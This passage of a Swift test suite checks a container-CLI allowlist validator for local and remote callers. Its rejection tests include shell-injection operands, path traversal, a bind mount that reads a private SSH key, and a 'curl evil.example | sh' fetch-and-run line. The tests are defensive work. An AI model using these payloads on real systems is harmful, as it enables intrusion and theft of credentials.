import Foundation
import Testing
@testable import FlotillaCore

private struct AllowedCase {
    let input: [String]
    let canonical: [String]
    let mutates: Bool
    let timeout: TimeInterval

    init(_ input: [String],
         canonical: [String]? = nil,
         mutates: Bool,
         timeout: TimeInterval = 30) {
        self.input = input
        self.canonical = canonical ?? input
        self.mutates = mutates
        self.timeout = timeout
    }
}

private func requireRejected(
    _ args: [String],
    sourceLocation: SourceLocation = #_sourceLocation
) {
    if case .success(let command) = Allowlist.validate(args) {
        Issue.record(
            "Unexpectedly accepted \(args) as \(command.arguments)",
            sourceLocation: sourceLocation
        )
    }
}

@Test func defaultDenyRejectsMissingAndUnknownSubcommands() {
    let rejected: [[String]] = [
        [],
        [""],
        [" "],
        ["\t"],
        ["unknown"],
        ["exec", "victim", "id"],
        ["restart", "victim"],
        ["image"],
        ["image", "push", "alpine"],
        ["system"],
        // `system start` is allowed now (the app starts a stopped service for you), but only in
        // the shape it is offered in. These stay refused:
        ["system", "start", "--enable-kernel-install"],   // never install a kernel unasked
        ["system", "start", "--app-root", "/tmp/x"],      // host paths are not grammar
        ["system", "stop"],
    ]

    for args in rejected {
        requireRejected(args)
    }

    #expect(Allowlist.validate([]) == .failure(.emptyCommand))
    #expect(Allowlist.validate(["image", "push", "alpine"]) == .failure(.unknownSubcommand("image push")))
}

// MARK: - The wire-exposure dimension
//
// Added 2026-08-19 to close the audit's blocking finding: well-formed commands that no value
// shape can refuse. Reviewed the same day by the review, whose findings are folded in below — the
// substitution bypass in particular was a real hole in the first version.

@Test func everySpecStatesItsExposureExplicitly() {
    // A **partition**, not a list of the interesting half. the review's finding: asserting only the
    // local-only names lets a newly added spec become remotely reachable because its author
    // omitted the decision — the test passed and nobody chose anything. Every spec must be named
    // in exactly one of these two sets, so adding one fails here until someone decides.
    let localOnly: Set<String> = [
        "machine create", "machine set", "machine delete", "machine set-default",
        "machine run", "machine stop", "machine inspect", "machine logs",
        "system start",
    ]
    let exposed: Set<String> = [
        "ls", "list", "inspect", "stats", "exec", "copy", "logs",
        "start", "stop", "kill", "delete", "rm", "prune", "run",
        "image list", "image inspect", "image pull", "image delete", "image rm",
        "image prune", "image tag", "build",
        "volume list", "volume inspect", "volume create", "volume delete", "volume rm",
        "volume prune",
        "network list", "network inspect", "network create", "network delete", "network rm",
        "network prune",
        "machine list",
        "system status", "system version", "system df",
    ]

    let actualLocalOnly = Set(
        Allowlist.commands.filter {
            if case .localOnly = $0.exposure { return true } else { return false }
        }.map(\.name)
    )
    let actualExposed = Set(Allowlist.commands.map(\.name)).subtracting(actualLocalOnly)

    #expect(actualLocalOnly == localOnly)
    #expect(actualExposed == exposed)
    #expect(localOnly.isDisjoint(with: exposed))
    #expect(localOnly.union(exposed).count == Allowlist.commands.count)

    // And every local-only spec must say WHY, in the spec, where the decision is made.
    for spec in Allowlist.commands {
        if case .localOnly(let reason) = spec.exposure {
            #expect(!reason.isEmpty, "\(spec.name) is local-only with no stated reason")
        }
    }
}

@Test func remoteCallersCannotReachTheLocalOnlySurface() {
    // Every one of these is VALID GRAMMAR — that is the whole point. Under `.localOwner` they are
    // accepted; only the capability refuses them.
    let wellFormed: [[String]] = [
        ["machine", "delete", "production"],
        ["machine", "set-default", "attacker-chosen"],
        ["machine", "set", "home-mount=rw"],
        ["machine", "create", "--name", "loot", "alpine:3.22"],
        ["machine", "run", "--name", "loot", "--", "/bin/true"],
        ["machine", "stop"],
        ["machine", "inspect"],
        ["machine", "logs", "-n", "100"],
        ["system", "start", "--disable-kernel-install", "--timeout", "60"],
    ]
    for args in wellFormed {
        guard case .success = Allowlist.validate(args) else {
            Issue.record("\(args) should be valid for the local owner")
            continue
        }
        guard case .failure(.notExposedToWire) = Allowlist.validate(args, wirePolicy: .remotePeer) else {
            // Refused as "not offered", never as "no such subcommand": a peer must not learn that
            // probing and mistyping look the same.
            Issue.record("\(args) must be refused over the wire as notExposedToWire")
            continue
        }
    }
}

@Test func substitutionCannotLaunderExposure() {
    // the review's BLOCKER. `substituting()` swaps `machine run` for `interactiveMachineRun` under
    // `.interactiveShell`, and that substitute carried the default exposure — so this exact argv
    // was ACCEPTED for a remote peer holding an interactive-shell policy, granting a shell inside
    // the substrate VM. The check now runs on the pre-substitution spec as well.
    let shellIntoTheVM = ["machine", "run", "-n", "production", "-i", "-t"]
    guard case .failure(.notExposedToWire) = Allowlist.validate(
        shellIntoTheVM, execPolicy: .interactiveShell, wirePolicy: .remotePeer) else {
        Issue.record("interactive machine run must never be reachable over the wire")
        return
    }
    // Still available to the owner, which is the whole reason the substitution exists.
    guard case .success = Allowlist.validate(
        shellIntoTheVM, execPolicy: .interactiveShell, wirePolicy: .localOwner) else {
        Issue.record("the Shell tab's login shell must still work locally")
        return
    }
    // Same for the permissive `exec` grammar.
    guard case .failure(.notExposedToWire) = Allowlist.validate(
        ["exec", "-i", "-t", "web", "--", "sh"],
        execPolicy: .interactiveShell, wirePolicy: .remotePeer) else {
        Issue.record("interactive exec must never be reachable over the wire")
        return
    }
}

@Test func remoteCallersMustBoundTheirReads() {
    // `logs` without `-n` reads an entire log, and bare `stats` streams until killed. Both are
    // fine for the owner and are a denial of service from a peer.
    guard case .success = Allowlist.validate(["logs", "web"]) else {
        Issue.record("unbounded logs should be valid locally"); return
    }
    guard case .failure(.flagRequiredOverWire(_, let logFlag)) =
            Allowlist.validate(["logs", "web"], wirePolicy: .remotePeer) else {
        Issue.record("unbounded logs must be refused over the wire"); return
    }
    #expect(logFlag == "n")

    guard case .failure(.flagRequiredOverWire(_, let statsFlag)) =
            Allowlist.validate(["stats", "--format", "json"], wirePolicy: .remotePeer) else {
        Issue.record("bare stats must be refused over the wire"); return
    }
    #expect(statsFlag == "no-stream")

    // The bounded forms go through — including `-n`, whose short-only spelling the flag parser did
    // not record until this landed, which would have made the requirement unsatisfiable.
    for args in [["logs", "-n", "100", "web"], ["stats", "--no-stream", "--format", "json"]] {
        guard case .success = Allowlist.validate(args, wirePolicy: .remotePeer) else {
            Issue.record("\(args) should be accepted over the wire")
            continue
        }
    }
}

@Test func everyRequiredWireFlagIsActuallyDeclaredOnItsSpec() {
    // the review's finding: `wireRequiredFlags` is stringly typed, so a typo ("no_stream") would make a
    // command permanently unsatisfiable for peers — a self-inflicted denial of service that no
    // other test would notice. Also checks the short-only spelling resolves, since `-n` has no
    // long form.
    for spec in Allowlist.commands {
        for required in spec.wireRequiredFlags {
            let matches = spec.flags.contains { $0.long == required }
                || (required.count == 1 && spec.flags.contains { $0.short == required.first })
            #expect(matches, "\(spec.name) requires \(required) over the wire, which it does not declare")
        }
    }
}

@Test func theExposedSurfaceStaysUsableOverTheWire() {
    // A capability that amputates the half a client actually needs is its own kind of failure.
    for args in [["ls", "--all", "--format", "json"], ["inspect", "web"], ["image", "list"],
                 ["volume", "list"], ["network", "list"], ["system", "status"],
                 ["start", "web"], ["stop", "web"], ["machine", "list"]] {
        guard case .success = Allowlist.validate(args, wirePolicy: .remotePeer) else {
            Issue.record("\(args) should still be reachable over the wire")
            continue
        }
    }
}

@Test func aRefusedRemoteCommandNeverReachesTheHost() {
    // the review's finding: the other tests prove the *validator* refuses, not that nothing is spawned.
    // This one records every argv the host is asked to run, so a future refactor that validates
    // and then executes anyway fails here rather than in production.
    final class RecordingHost: ContainerHost, @unchecked Sendable {
        var seen: [[String]] = []
        func run(_ args: [String]) throws -> CommandResult {
            seen.append(args)
            return CommandResult(stdout: "", stderr: "", exitCode: 0)
        }
    }
    let host = RecordingHost()
    let remote = ContainerCLI(host: host, mountPolicy: .denyHostPaths, wirePolicy: .remotePeer)

    #expect(throws: (any Error).self) { try remote.deleteMachine("production") }
    #expect(throws: (any Error).self) { try remote.startMachine("production") }
    #expect(throws: (any Error).self) { try remote.logs("web", lines: 0) }
    #expect(host.seen.isEmpty, "a refused command must never reach the host: \(host.seen)")
}

@Test func machineListRefusesFormatsTheCLIItselfRejects() {
    // The allowlist must be at least as strict as the CLI. Captured help, container 1.0.0:
    // every other leaf's `--format` lists `json, table, yaml, toml`, but
    // `container machine list` lists exactly `json, table`. Accepting yaml there passed
    // validation and then failed in the CLI — grammar drift, found in the 47-spec audit.
    requireRejected(["machine", "list", "--format", "yaml"])
    requireRejected(["machine", "list", "--format", "toml"])
    for accepted in [["machine", "list", "--format", "json"],
                     ["machine", "list", "--format", "table"],
                     // And the wider set is still right everywhere the CLI really allows it.
                     ["list", "--format", "yaml"]] {
        guard case .success = Allowlist.validate(accepted) else {
            Issue.record("expected \(accepted) to be accepted")
            return
        }
    }
}

@Test func rejectsShellSyntaxInOperands() {
    let payloads = [
        "victim;id",
        "victim|id",
        "victim&id",
        "victim`id`",
        "victim$(id)",
        "victim\nid",
        "victim\rid",
    ]

    for payload in payloads {
        requireRejected(["inspect", payload])
        requireRejected(["image", "pull", "alpine\(payload)"])
    }
}

@Test func rejectsShellSyntaxInStructuredFlagValues() {
    let payloads = [
        "victim;id",
        "victim|id",
        "victim&id",
        "victim`id`",
        "victim$(id)",
        "victim\nid",
    ]

    for payload in payloads {
        requireRejected(["run", "--name", payload, "alpine"])
        requireRejected(["run", "--network=\(payload)", "alpine"])
        requireRejected(["image", "pull", "--platform", "linux/\(payload)", "alpine"])
    }
}

@Test func rejectsTraversalAndAbsolutePathsWhereIdentifiersOrImagesAreRequired() {
    let forbiddenOperands = [
        "../victim",
        "safe/../victim",
        "./victim",
        "/tmp/victim",
        "/",
    ]

    for operand in forbiddenOperands {
        requireRejected(["inspect", operand])
        requireRejected(["volume", "inspect", operand])
        requireRejected(["network", "inspect", operand])
        requireRejected(["image", "pull", operand])
    }

    requireRejected(["run", "--volume", "../host:/data:ro", "alpine"])
    requireRejected(["run", "--volume", "/tmp/../etc:/data:ro", "alpine"])
    requireRejected(["run", "--volume", "/tmp:/data/../escape:ro", "alpine"])
    requireRejected(["run", "--volume", "/:/data:ro", "alpine"])
    requireRejected(["run", "--volume", "/tmp:/:ro", "alpine"])
}

@Test func arbitraryHostBindMountCannotBypassTheRemoteExecutionBoundary() {
    // SECURITY REGRESSION: this currently fails. A compromised client can bind-mount
    // any host tree except "/" and combine it with the deliberately permissive
    // in-container command tail. That permits remote reads from /Users (and writes to
    // other sensitive paths with :rw), which bypasses the intended Q1 containment even
    // though the spawned process itself is the allowlisted `container run`.
    requireRejected([
        "run",
        "--volume", "/Users:/host:ro",
        "alpine",
        "sh", "-c", "cat /host/victim/.ssh/id_ed25519",
    ])
}

@Test func acceptsOnlyDeclaredFlagGrammarAndCanonicalisesSpellings() throws {
    let separated = try Allowlist.validated(["ls", "--format", "json", "-a", "-q"])
    let inline = try Allowlist.validated(["ls", "--format=json", "--all", "--quiet"])
    #expect(separated == inline)
    #expect(inline.arguments == ["ls", "--format", "json", "--all", "--quiet"])

    requireRejected(["ls", "--wat"])
    requireRejected(["ls", "-z"])
    requireRejected(["ls", "-aq"])
    requireRejected(["logs", "-n5", "victim"])
    requireRejected(["logs", "-n=5", "victim"])
    requireRejected(["ls", "--all=true"])
    requireRejected(["ls", "--format"])
    requireRejected(["run", "--name"])
    requireRejected(["run", "--name", "--detach", "alpine"])
    requireRejected(["ls", "--all", "--all"])
    requireRejected(["ls", "-a", "--all"])

    let afterOperand = try Allowlist.validated(["stop", "one", "--time=5", "two", "-s", "TERM"])
    #expect(afterOperand.arguments == ["stop", "--time", "5", "--signal", "TERM", "one", "two"])
}

@Test func repeatableFlagsAreBoundedAndCanonicalised() throws {
    let accepted = ["run"] + (1...24).flatMap { ["-e", "KEY\($0)=value"] } + ["alpine"]
    let command = try Allowlist.validated(accepted)
    #expect(command.arguments.first == "run")
    #expect(command.arguments.filter { $0 == "--env" }.count == 24)
    #expect(command.arguments.last == "alpine")

    requireRejected(accepted.dropLast() + ["--env", "EXTRA=value", "alpine"])
    requireRejected(["run", "--detach", "-d", "alpine"])
    requireRejected(["volume", "create", "--label", "a=1", "--label=b=2",
                     "--label", "c=3", "--label", "d=4", "--label", "e=5",
                     "--label", "f=6", "--label", "g=7", "--label", "h=8",
                     "--label", "i=9", "vol"])
}

@Test func separatorAndTrailingCommandPolicyAreEnforced() throws {
    requireRejected(["inspect", "--", "victim"])
    requireRejected(["ls", "--"])
    requireRejected(["run", "--", "alpine", "id"])
    requireRejected(["run", "alpine", "--", "echo\nforged"])

    let implicit = try Allowlist.validated(["run", "alpine", "echo", "--rm", ";", "id"])
    let explicit = try Allowlist.validated(["run", "alpine", "--", "echo", "--rm", ";", "id"])
    #expect(implicit == explicit)
    #expect(explicit.arguments == ["run", "alpine", "--", "echo", "--rm", ";", "id"])

    let emptySeparator = try Allowlist.validated(["run", "alpine", "--"])
    #expect(emptySeparator.arguments == ["run", "alpine"])

    requireRejected(["run", "alpine"] + Array(repeating: "x", count: 25))
}

@Test func operandMinimumMaximumAndWaiversAreEnforced() throws {
    requireRejected(["inspect"])
    requireRejected(["start"])
    requireRejected(["stop"])
    requireRejected(["delete"])
    requireRejected(["run"])
    requireRejected(["image", "pull"])
    requireRejected(["volume", "create"])
    requireRejected(["network", "create"])

    _ = try Allowlist.validated(["stop", "--all"])
    _ = try Allowlist.validated(["delete", "-a"])
    _ = try Allowlist.validated(["image", "rm", "--all"])
    _ = try Allowlist.validated(["volume", "delete", "--all"])
    _ = try Allowlist.validated(["network", "rm", "--all"])

    requireRejected(["inspect"] + (1...33).map { "c\($0)" })
    requireRejected(["logs", "one", "two"])
    requireRejected(["image", "pull", "alpine", "busybox"])
    requireRejected(["volume", "create", "one", "two"])
    requireRejected(["network", "create", "one", "two"])
}

@Test func structuralLimitsRejectPathologicalArgvBeforeParsing() {
    let defaults = Allowlist.Limits.default
    requireRejected(Array(repeating: "ls", count: defaults.maxArgumentCount + 1))
    requireRejected(["inspect", String(repeating: "a", count: defaults.maxArgumentLength + 1)])

    let totalLimits = Allowlist.Limits(
        maxArgumentCount: 10,
        maxArgumentLength: 10,
        maxTotalLength: 8
    )
    #expect(
        Allowlist.validate(["inspect", "ab"], limits: totalLimits)
            == .failure(.commandTooLong(length: 9, limit: 8))
    )

    let countLimits = Allowlist.Limits(maxArgumentCount: 2, maxArgumentLength: 100, maxTotalLength: 100)
    #expect(
        Allowlist.validate(["run", "alpine", "id"], limits: countLimits)
            == .failure(.tooManyArguments(count: 3, limit: 2))
    )

    let lengthLimits = Allowlist.Limits(maxArgumentCount: 3, maxArgumentLength: 4, maxTotalLength: 100)
    #expect(
        Allowlist.validate(["inspect", "safe"], limits: lengthLimits)
            == .failure(.argumentTooLong(length: 7, limit: 4))
    )
}

@Test func rejectsUnicodeLookalikesInvisibleCharactersAndCaseVariants() {
    let unknownSubcommands = [
        "LS",
        "List",
        "İnspect",
        "іnspect", // Cyrillic small i
        "ｌｓ",     // full-width Latin letters
        "ls\u{200B}",
    ]
    for subcommand in unknownSubcommands {
        requireRejected([subcommand])
    }

    requireRejected(["Image", "pull", "alpine"])
    requireRejected(["image", "Pull", "alpine"])
    requireRejected(["inspect", "аlpine"]) // Cyrillic small a
    requireRejected(["inspect", "Ａlpine"]) // full-width A
    requireRejected(["inspect", "safe\u{202E}evil"])
    requireRejected(["image", "pull", "alpine\u{00A0}:latest"])
}

@Test func mutationClassificationMatchesTheSecurityPolicy() {
    let expectedMutating: Set<String> = [
        "start", "stop", "kill", "delete", "rm", "prune", "run",
        // Writes the host filesystem in one direction and reads it in the other.
        "copy",
        // A machine IS the VM every container on the host runs inside. `machine delete`
        // destroys that substrate, so nothing here is a convenience mutation.
        "machine create", "machine set", "machine stop", "machine delete", "machine run",
        "machine set-default",
        "image pull", "image delete", "image rm", "image prune", "image tag",
        // Reads a host directory tree and writes a new image. See the `build` tests below
        // for the flags that are refused outright rather than validated.
        "build",
        "volume create", "volume delete", "volume rm", "volume prune",
        "network create", "network delete", "network rm", "network prune",
        // The only mutating `system` leaf: it changes machine state (it launches services).
        "system start",
    ]
    let actualMutating = Set(Allowlist.commands.filter(\.mutates).map(\.name))
    #expect(actualMutating == expectedMutating)

    let expectedReadOnly: Set<String> = [
        "machine list", "machine inspect", "machine logs",
        "ls", "list", "inspect", "stats", "logs",
        "image list", "image inspect",
        "volume list", "volume inspect",
        "network list", "network inspect",
        "system status", "system version", "system df",
        // `exec` is read-only because the ONLY command it permits is a `ps` — see
        // TrailingPolicy.exact. If this ever moves to the mutating set, someone has widened
        // what exec can run, and that needs a fresh security review, not a test update.
        "exec",
    ]
    let actualReadOnly = Set(Allowlist.commands.filter { !$0.mutates }.map(\.name))
    #expect(actualReadOnly == expectedReadOnly)
    #expect(expectedMutating.isDisjoint(with: expectedReadOnly))
    #expect(expectedMutating.union(expectedReadOnly).count == Allowlist.commands.count)
}

@Test func everyAllowlistedCommandShapeProducesItsCanonicalCommand() throws {
    makeBuildFixtures()
    let digest = String(repeating: "a", count: 64)
    let cases: [AllowedCase] = [
        AllowedCase(["ls", "-a", "--format=json", "-q"],
                    canonical: ["ls", "--all", "--format", "json", "--quiet"], mutates: false),
        AllowedCase(["list"], mutates: false),
        AllowedCase(["inspect", "one", "two"], mutates: false),
        AllowedCase(["stats", "--no-stream", "--format", "table", "one"], mutates: false),
        AllowedCase(["logs", "--boot", "-n", "100", "one"], mutates: false),

        AllowedCase(["start", "one"], mutates: true, timeout: 120),
        AllowedCase(["stop", "-a", "-t", "10", "-s", "SIGTERM"],
                    canonical: ["stop", "--all", "--time", "10", "--signal", "SIGTERM"],
                    mutates: true, timeout: 120),
        AllowedCase(["delete", "-f", "one"], canonical: ["delete", "--force", "one"],
                    mutates: true, timeout: 120),
        AllowedCase(["rm", "--all"], mutates: true, timeout: 120),
        AllowedCase(["kill", "-a", "-s", "TERM"],
                    canonical: ["kill", "--all", "--signal", "TERM"],
                    mutates: true, timeout: 30),
        AllowedCase(["prune"], mutates: true, timeout: 120),
        AllowedCase(
            ["run", "-d", "--rm", "--name=friendly", "-e", "KEY=value", "-p", "8080:80/tcp",
             "-v", "/tmp/data:/data:ro", "-c", "4", "-m", "512MB", "--network", "bridge",
             "--platform", "linux/arm64/v8", "registry.example/alpine:latest", "echo", "hello"],
            canonical: ["run", "--detach", "--rm", "--name", "friendly", "--env", "KEY=value",
                        "--publish", "8080:80/tcp", "--volume", "/tmp/data:/data:ro",
                        "--cpus", "4", "--memory", "512MB", "--network", "bridge",
                        "--platform", "linux/arm64/v8", "registry.example/alpine:latest",
                        "--", "echo", "hello"],
            mutates: true,
            timeout: 600
        ),

        AllowedCase(["image", "list", "-q", "--format=yaml"],
                    canonical: ["image", "list", "--quiet", "--format", "yaml"], mutates: false),
        AllowedCase(["image", "inspect", "alpine", "docker.io/library/alpine:latest"], mutates: false),
        AllowedCase(["image", "pull", "--platform=linux/arm64", "alpine@sha256:\(digest)"],
                    canonical: ["image", "pull", "--platform", "linux/arm64",
                                "alpine@sha256:\(digest)"],
                    mutates: true, timeout: 1800),
        AllowedCase(["image", "delete", "-a"], canonical: ["image", "delete", "--all"],
                    mutates: true),
        AllowedCase(["image", "rm", "-f", "alpine"], canonical: ["image", "rm", "--force", "alpine"],
                    mutates: true),
        AllowedCase(["image", "prune", "-a"], canonical: ["image", "prune", "--all"],
                    mutates: true, timeout: 120),
        AllowedCase(["image", "tag", "alpine:latest", "alpine:mine"], mutates: true),

        // The context directory is `/tmp/...` because the policy below permits `/tmp` — a
        // build with an explicit path is authorised by MountPolicy, never by its grammar.
        AllowedCase(["build", "-f", "/tmp/build/Dockerfile", "-t", "app:latest",
                     "--build-arg", "VERSION=1.2", "-l", "team=infra", "--no-cache",
                     "--platform", "linux/arm64", "--target", "runtime", "--progress", "plain",
                     "-q", "--pull", "-c", "4", "-m", "8G", "--os", "linux", "-a", "arm64",
                     "/tmp/build"],
                    canonical: ["build", "--file", "/tmp/build/Dockerfile", "--tag", "app:latest",
                                "--build-arg", "VERSION=1.2", "--label", "team=infra",
                                "--no-cache", "--platform", "linux/arm64", "--target", "runtime",
                                "--progress", "plain", "--quiet", "--pull", "--cpus", "4",
                                "--memory", "8G", "--os", "linux", "--arch", "arm64",
                                "/tmp/build"],
                    mutates: true, timeout: 1800),

        AllowedCase(["machine", "list", "--format", "json"], mutates: false),
        AllowedCase(["machine", "inspect", "dev"], mutates: false),
        AllowedCase(["machine", "logs", "-n", "50", "--boot", "dev"], mutates: false),
        AllowedCase(["machine", "create", "-n", "dev", "--cpus", "4", "--memory", "8G",
                     "--home-mount", "ro", "alpine:3.22"],
                    canonical: ["machine", "create", "--name", "dev", "--cpus", "4",
                                "--memory", "8G", "--home-mount", "ro",
                                "alpine:3.22"],
                    mutates: true, timeout: 600),
        AllowedCase(["machine", "set", "-n", "dev", "cpus=4", "memory=8G", "home-mount=ro"],
                    canonical: ["machine", "set", "--name", "dev", "cpus=4", "memory=8G",
                                "home-mount=ro"],
                    mutates: true),
        // The boot no-op. `mutates: true` because it starts a VM.
        //
        // A `--` in the input is consumed and **not** re-emitted: `.exact` trailing does not
        // carry the separator the way `.command` does. Both spellings were run against the
        // live CLI on 3 August and both boot the machine and exit 0, so the canonical form is
        // simply the shorter one — checked rather than assumed, since the first draft of this
        // case asserted the opposite and would have been "green" either way.
        AllowedCase(["machine", "run", "-n", "dev", "--", "/bin/true"],
                    canonical: ["machine", "run", "--name", "dev", "/bin/true"],
                    mutates: true, timeout: 300),
        AllowedCase(["machine", "stop", "dev"], mutates: true, timeout: 120),
        AllowedCase(["machine", "delete", "dev"], mutates: true, timeout: 120),
        AllowedCase(["machine", "set-default", "dev"], mutates: true),

        // Host end gated by MountPolicy — see the `container copy` tests below.
        AllowedCase(["copy", "web:/etc/hostname", "/tmp/flotilla/hostname"],
                    mutates: true, timeout: 120),

        AllowedCase(["volume", "list", "--format", "toml"], mutates: false),
        AllowedCase(["volume", "inspect", "data"], mutates: false),
        // Canonicalises to `-s`, NOT `--size`: the CLI has no long form for it. This case
        // previously asserted `--size` and so encoded the bug rather than catching it.
        AllowedCase(["volume", "create", "-s", "2GB", "--opt", "type=fast",
                     "--label=team=infra", "data"],
                    canonical: ["volume", "create", "-s", "2GB", "--opt", "type=fast",
                                "--label", "team=infra", "data"], mutates: true),
        AllowedCase(["volume", "delete", "--all"], mutates: true),
        AllowedCase(["volume", "rm", "data"], mutates: true),
        AllowedCase(["volume", "prune"], mutates: true, timeout: 120),

        AllowedCase(["network", "list", "-q"], canonical: ["network", "list", "--quiet"],
                    mutates: false),
        AllowedCase(["network", "inspect", "private"], mutates: false),
        AllowedCase(["network", "create", "--internal", "--subnet", "10.0.0.0/24",
                     "--label", "team=infra", "--option=mtu=1500", "private"],
                    canonical: ["network", "create", "--internal", "--subnet", "10.0.0.0/24",
                                "--label", "team=infra", "--option", "mtu=1500", "private"],
                    mutates: true, timeout: 60),
        AllowedCase(["network", "delete", "-a"], canonical: ["network", "delete", "--all"],
                    mutates: true),
        AllowedCase(["network", "rm", "private"], mutates: true),
        AllowedCase(["network", "prune"], mutates: true, timeout: 120),

        AllowedCase(["system", "status", "--format=json"],
                    canonical: ["system", "status", "--format", "json"], mutates: false),
        AllowedCase(["system", "version"], mutates: false),
        AllowedCase(["system", "df", "--format", "table"], mutates: false),
        // The exact argv `ContainerCLI.startSystem` sends, verified accepted by the live CLI.
        // `--disable-kernel-install` is mandatory in practice: the flag defaults to prompting,
        // and a windowed app has nowhere to show a prompt.
        AllowedCase(["system", "start", "--disable-kernel-install", "--timeout", "60"],
                    mutates: true, timeout: 120),

        // The separator is required on input but DROPPED from the canonical argv: the real
        // `container exec` treats `--` as the program name and fails on it. Caught by running
        // the CLI, not by a unit test, which is why the canonical form is pinned here.
        AllowedCase(["exec", "web", "--", "ps", "-o", "pid,comm,args"],
                    canonical: ["exec", "web", "ps", "-o", "pid,comm,args"],
                    mutates: false, timeout: 15),
    ]

    #expect(cases.count == Allowlist.commands.count)
    // These are the *positive* shapes, so the `run` case deliberately includes a host
    // bind mount. Since `MountPolicy.denyHostPaths` is the default, the legitimate case
    // has to name a policy that permits it — which is the point: a host mount is
    // authorised by the filesystem owner's policy, never by the command's grammar.
    let policy = MountPolicy.roots(["/tmp"])
    for testCase in cases {
        let command = try Allowlist.validated(testCase.input, mountPolicy: policy)
        let pathLength = command.subcommand.count
        #expect(command.subcommand == Array(testCase.canonical.prefix(pathLength)))
        #expect(command.arguments == testCase.canonical)
        #expect(command.mutates == testCase.mutates)
        #expect(command.timeoutHint == testCase.timeout)
        // `localPreview`, not `auditDescription`. This case is about canonicalisation — that two
        // spellings of one request produce one argv — and the preview is the property that still
        // shows the argv whole. The audit string deliberately shapes values away, and asserting
        // canonicalisation through it would test two things badly instead of one thing well.
        #expect(command.localPreview == (["container"] + testCase.canonical).joined(separator: " "))
    }
}

// MARK: - exec is locked to one command
//
// The process list needs `container exec <id> ps`. Allowlisting `exec` at all is the risky
// part: with `.command(maxTokens:)` it would also permit `exec <id> sh`, an interactive shell
// inside the container — precisely the "generic remote shell" the transport decision rules
// out, and far worse in Phase 2 where the caller is a remote peer. `TrailingPolicy.exact` is
// what keeps the grant narrow, so these tests exist to stop anyone widening it by accident.

@Test func execPermitsExactlyTheProcessListing() throws {
    let validated = try Allowlist.validated(["exec", "web", "--", "ps", "-o", "pid,comm,args"])
    #expect(validated.subcommand == ["exec"])
    #expect(validated.mutates == false)     // a ps changes nothing
}

@Test func execRefusesAShell() throws {
    // The whole reason `.exact` exists.
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["exec", "web", "--", "sh"])
    }
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["exec", "web", "--", "/bin/bash", "-c", "curl evil.example | sh"])
    }
}

@Test func execRefusesAnythingButTheExactTokens() throws {
    // A superset...
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["exec", "web", "--", "ps", "-o", "pid,comm,args", "--forest"])
    }
    // ...a subset...
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["exec", "web", "--", "ps"])
    }
    // ...a reordering...
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["exec", "web", "--", "ps", "pid,comm,args", "-o"])
    }
    // ...a different ps format...
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["exec", "web", "--", "ps", "-o", "pid,comm,args,uid"])
    }
    // ...and nothing at all.
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["exec", "web"])
    }
}

@Test func execStillRequiresAValidContainerIdentifier() throws {
    // The operand shape is unchanged by the trailing policy — a Unicode lookalike or a
    // traversal in the id must still be rejected.
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["exec", "../etc", "--", "ps", "-o", "pid,comm,args"])
    }
}

// MARK: - IPv6 prefixes
//
// `--subnet-v6` needs its own shape: accepting either family wherever one is expected would
// let an IPv6 prefix reach `--subnet` and vice versa, which the CLI then rejects far less
// clearly than we can. The validator is hand-rolled because FlotillaCore stays
// Foundation-only, so it is worth attacking properly.

@Test func ipv6PrefixesAreAccepted() throws {
    for good in ["fd00:1234::/64", "fd6d:1605:d4b8:ad0f::/64", "2001:db8::/32",
                 "::/0", "fe80::1/128", "1:2:3:4:5:6:7:8/128"] {
        #expect(throws: Never.self, "should accept \(good)") {
            try Allowlist.validated(["network", "create", "--subnet-v6", good, "net"])
        }
    }
}

@Test func malformedIPv6PrefixesAreRejected() throws {
    for bad in [
        "fd00:1234::",              // no prefix length
        "fd00:1234::/",             // empty prefix length
        "fd00:1234::/129",          // out of range
        "fd00:1234::/-1",           // negative
        "fd00::1::2/64",            // two elisions
        "fd00:::1/64",              // triple colon
        "fd00:12345::/64",          // group too long
        "fd00:zzzz::/64",           // not hex
        "1:2:3:4:5:6:7/64",         // too few groups, no elision
        "1:2:3:4:5:6:7:8:9/64",     // too many groups
        "10.0.0.0/24",              // an IPv4 range must NOT satisfy the v6 shape
        "fd00:1234::/64 extra",     // trailing junk
        "",                         // empty
    ] {
        #expect(throws: (any Error).self, "should reject \(bad)") {
            try Allowlist.validated(["network", "create", "--subnet-v6", bad, "net"])
        }
    }
}

@Test func theTwoAddressFamiliesDoNotAcceptEachOther() throws {
    // The whole reason `.cidrV6` is a separate shape.
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["network", "create", "--subnet", "fd00:1234::/64", "net"])
    }
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["network", "create", "--subnet-v6", "10.0.0.0/24", "net"])
    }
    // Both together is legitimate — a dual-stack network.
    #expect(throws: Never.self) {
        try Allowlist.validated([
            "network", "create", "--subnet", "10.10.0.0/24", "--subnet-v6", "fd00:1234::/64", "net"
        ])
    }
}

// MARK: - `volume create -s` has no long form

@Test func volumeSizeCanonicalisesToTheShortFlagOnly() throws {
    // The CLI rejects `--size` outright; only `-s` exists. Since `canonicalSpelling` prefers
    // a long name when one is declared, declaring one here silently produced an argv the CLI
    // would refuse. This pins the emitted spelling.
    let validated = try Allowlist.validated(["volume", "create", "-s", "64M", "data"])
    #expect(validated.arguments == ["volume", "create", "-s", "64M", "data"])
    #expect(validated.arguments.contains("--size") == false)
}

@Test func volumeSizeRejectsTheLongFormJustAsTheCLIDoes() throws {
    // Better to refuse it here, where the message names the rule, than to pass it through
    // and have the CLI answer with a usage dump.
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["volume", "create", "--size", "64M", "data"])
    }
}

// MARK: - the review's allowlist audit, applied
//
// All three verified against the live CLI before being fixed, not taken on the help text alone.

@Test func startTakesExactlyOneContainer() throws {
    // `container start idle cache` is refused with "Unexpected argument 'cache'". The table
    // previously allowed 32 operands and so canonicalised a command the CLI rejects.
    #expect(throws: Never.self) { try Allowlist.validated(["start", "web"]) }
    #expect(throws: (any Error).self) { try Allowlist.validated(["start", "web", "cache"]) }
    // The genuinely plural ones must keep working.
    #expect(throws: Never.self) { try Allowlist.validated(["stop", "web", "cache"]) }
    #expect(throws: Never.self) { try Allowlist.validated(["rm", "web", "cache"]) }
